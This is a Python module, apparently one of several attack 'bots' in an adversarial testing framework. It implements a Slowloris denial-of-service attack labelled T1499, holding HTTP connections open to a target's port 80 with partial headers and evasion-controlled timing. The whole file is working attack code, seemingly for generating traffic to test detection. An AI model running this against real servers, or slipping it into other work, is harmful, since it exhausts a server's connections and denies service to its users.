import random
import time

from src.adversarial.bots.base import get_timing

CLASS_ID = "T1499_slowloris"


def run(target_ip: str, evasion: str) -> int:
    import socket
    sockets = []
    for _ in range(20):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, 80))
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
            sockets.append(sock)
        except OSError:
            pass
        time.sleep(get_timing(evasion))

    for i in range(5):
        for sock in sockets:
            try:
                sock.send(f"X-Padding-{i}: {'a'*10}\r\n".encode())
            except OSError:
                pass
        time.sleep(get_timing(evasion))

    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass
    return len(sockets)
